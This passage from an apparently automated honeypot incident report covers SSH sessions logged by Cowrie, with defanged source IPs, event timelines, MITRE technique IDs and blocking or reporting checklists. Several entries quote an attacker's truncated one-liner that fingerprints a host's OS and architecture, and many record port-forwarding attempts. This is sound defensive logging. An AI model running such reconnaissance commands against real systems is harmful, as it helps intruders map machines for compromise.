| **First Seen** | 2026-08-16 01:07 |
| **Last Seen** | 2026-08-16 01:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:07:46` | `cowrie.session.connect` |
| `2026-08-16 01:07:47` | `cowrie.client.version` |
| `2026-08-16 01:07:47` | `cowrie.client.kex` |
| `2026-08-16 01:07:53` | `cowrie.login.success` |
| `2026-08-16 01:07:55` | `cowrie.session.params` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.success` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:55` | `cowrie.command.input` |
| `2026-08-16 01:07:56` | `cowrie.log.closed` |
| `2026-08-16 01:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b2f41abd8d

| Field | Detail |
|---|---|
| **Source IP** | `115.245.122[.]146` |
| **First Seen** | 2026-08-16 01:08 |
| **Last Seen** | 2026-08-16 01:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:08:02` | `cowrie.session.connect` |
| `2026-08-16 01:08:04` | `cowrie.client.version` |
| `2026-08-16 01:08:04` | `cowrie.client.kex` |
| `2026-08-16 01:08:06` | `cowrie.login.success` |
| `2026-08-16 01:08:07` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.245.122[.]146` to AbuseIPDB if not already reported
- [ ] Block `115.245.122[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ae443fabd6

| Field | Detail |
|---|---|
| **Source IP** | `14.33.95[.]62` |
| **First Seen** | 2026-08-16 01:08 |
| **Last Seen** | 2026-08-16 01:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:08:12` | `cowrie.session.connect` |
| `2026-08-16 01:08:13` | `cowrie.client.version` |
| `2026-08-16 01:08:13` | `cowrie.client.kex` |
| `2026-08-16 01:08:15` | `cowrie.login.success` |
| `2026-08-16 01:08:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.95[.]62` to AbuseIPDB if not already reported
- [ ] Block `14.33.95[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9bf3f4ba69

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:09 |
| **Last Seen** | 2026-08-16 01:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:09:01` | `cowrie.session.connect` |
| `2026-08-16 01:09:01` | `cowrie.client.version` |
| `2026-08-16 01:09:02` | `cowrie.client.kex` |
| `2026-08-16 01:09:06` | `cowrie.login.success` |
| `2026-08-16 01:09:09` | `cowrie.session.params` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.success` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:09` | `cowrie.command.input` |
| `2026-08-16 01:09:10` | `cowrie.log.closed` |
| `2026-08-16 01:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c84f3bab0d27

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:10 |
| **Last Seen** | 2026-08-16 01:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:10:19` | `cowrie.session.connect` |
| `2026-08-16 01:10:20` | `cowrie.client.version` |
| `2026-08-16 01:10:20` | `cowrie.client.kex` |
| `2026-08-16 01:10:24` | `cowrie.login.success` |
| `2026-08-16 01:10:27` | `cowrie.session.params` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.success` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.command.input` |
| `2026-08-16 01:10:27` | `cowrie.log.closed` |
| `2026-08-16 01:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052d7d768289

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 01:10 |
| **Last Seen** | 2026-08-16 01:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:10:22` | `cowrie.session.connect` |
| `2026-08-16 01:10:22` | `cowrie.client.version` |
| `2026-08-16 01:10:22` | `cowrie.client.kex` |
| `2026-08-16 01:10:34` | `cowrie.login.success` |
| `2026-08-16 01:10:34` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:10:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 01:10:35` | `cowrie.direct-tcpip.data` |
| `2026-08-16 01:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cfc2cd5c5f8

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-08-16 01:11 |
| **Last Seen** | 2026-08-16 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:11:18` | `cowrie.session.connect` |
| `2026-08-16 01:11:19` | `cowrie.client.version` |
| `2026-08-16 01:11:19` | `cowrie.client.kex` |
| `2026-08-16 01:11:21` | `cowrie.login.success` |
| `2026-08-16 01:11:21` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a785d811b5e

| Field | Detail |
|---|---|
| **Source IP** | `117.158.160[.]42` |
| **First Seen** | 2026-08-16 01:11 |
| **Last Seen** | 2026-08-16 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:11:31` | `cowrie.session.connect` |
| `2026-08-16 01:11:32` | `cowrie.client.version` |
| `2026-08-16 01:11:32` | `cowrie.client.kex` |
| `2026-08-16 01:11:34` | `cowrie.login.success` |
| `2026-08-16 01:11:35` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `117.158.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c7df0f3fea

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:11 |
| **Last Seen** | 2026-08-16 01:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:11:37` | `cowrie.session.connect` |
| `2026-08-16 01:11:38` | `cowrie.client.version` |
| `2026-08-16 01:11:38` | `cowrie.client.kex` |
| `2026-08-16 01:11:40` | `cowrie.login.success` |
| `2026-08-16 01:11:42` | `cowrie.session.params` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.success` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:42` | `cowrie.command.input` |
| `2026-08-16 01:11:43` | `cowrie.log.closed` |
| `2026-08-16 01:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b450c5c335e5

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 01:12 |
| **Last Seen** | 2026-08-16 01:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:12:10` | `cowrie.session.connect` |
| `2026-08-16 01:12:10` | `cowrie.client.version` |
| `2026-08-16 01:12:13` | `cowrie.client.kex` |
| `2026-08-16 01:12:14` | `cowrie.login.success` |
| `2026-08-16 01:12:15` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:12:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 01:12:15` | `cowrie.direct-tcpip.data` |
| `2026-08-16 01:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93ea322f310

| Field | Detail |
|---|---|
| **Source IP** | `171.231.187[.]71` |
| **First Seen** | 2026-08-16 01:12 |
| **Last Seen** | 2026-08-16 01:13 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:12:50` | `cowrie.session.connect` |
| `2026-08-16 01:12:50` | `cowrie.client.version` |
| `2026-08-16 01:12:51` | `cowrie.client.kex` |
| `2026-08-16 01:13:07` | `cowrie.login.success` |
| `2026-08-16 01:13:08` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.187[.]71` to AbuseIPDB if not already reported
- [ ] Block `171.231.187[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e862b599df0b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:12 |
| **Last Seen** | 2026-08-16 01:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:12:51` | `cowrie.session.connect` |
| `2026-08-16 01:12:52` | `cowrie.client.version` |
| `2026-08-16 01:12:52` | `cowrie.client.kex` |
| `2026-08-16 01:12:56` | `cowrie.login.success` |
| `2026-08-16 01:12:59` | `cowrie.session.params` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.success` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.command.input` |
| `2026-08-16 01:12:59` | `cowrie.log.closed` |
| `2026-08-16 01:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6f0f984024

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-08-16 01:13 |
| **Last Seen** | 2026-08-16 01:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:13:59` | `cowrie.session.connect` |
| `2026-08-16 01:14:00` | `cowrie.client.version` |
| `2026-08-16 01:14:00` | `cowrie.client.kex` |
| `2026-08-16 01:14:03` | `cowrie.login.success` |
| `2026-08-16 01:14:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c26cfbe158

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:14 |
| **Last Seen** | 2026-08-16 01:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:14:03` | `cowrie.session.connect` |
| `2026-08-16 01:14:03` | `cowrie.client.version` |
| `2026-08-16 01:14:03` | `cowrie.client.kex` |
| `2026-08-16 01:14:06` | `cowrie.login.success` |
| `2026-08-16 01:14:08` | `cowrie.session.params` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.success` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:08` | `cowrie.command.input` |
| `2026-08-16 01:14:09` | `cowrie.log.closed` |
| `2026-08-16 01:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45417ea7dc59

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-16 01:14 |
| **Last Seen** | 2026-08-16 01:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:14:08` | `cowrie.session.connect` |
| `2026-08-16 01:14:09` | `cowrie.client.version` |
| `2026-08-16 01:14:09` | `cowrie.client.kex` |
| `2026-08-16 01:14:11` | `cowrie.login.success` |
| `2026-08-16 01:14:11` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a05f16f9e90

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 01:14 |
| **Last Seen** | 2026-08-16 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:14:30` | `cowrie.session.connect` |
| `2026-08-16 01:14:30` | `cowrie.client.version` |
| `2026-08-16 01:14:30` | `cowrie.client.kex` |
| `2026-08-16 01:14:31` | `cowrie.login.success` |
| `2026-08-16 01:14:31` | `cowrie.session.params` |
| `2026-08-16 01:14:31` | `cowrie.command.input` |
| `2026-08-16 01:14:32` | `cowrie.log.closed` |
| `2026-08-16 01:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ec4f8a21ff

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:15 |
| **Last Seen** | 2026-08-16 01:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:15:13` | `cowrie.session.connect` |
| `2026-08-16 01:15:14` | `cowrie.client.version` |
| `2026-08-16 01:15:14` | `cowrie.client.kex` |
| `2026-08-16 01:15:19` | `cowrie.login.success` |
| `2026-08-16 01:15:22` | `cowrie.session.params` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.success` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:22` | `cowrie.command.input` |
| `2026-08-16 01:15:23` | `cowrie.log.closed` |
| `2026-08-16 01:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ede850f0c1b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:16 |
| **Last Seen** | 2026-08-16 01:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
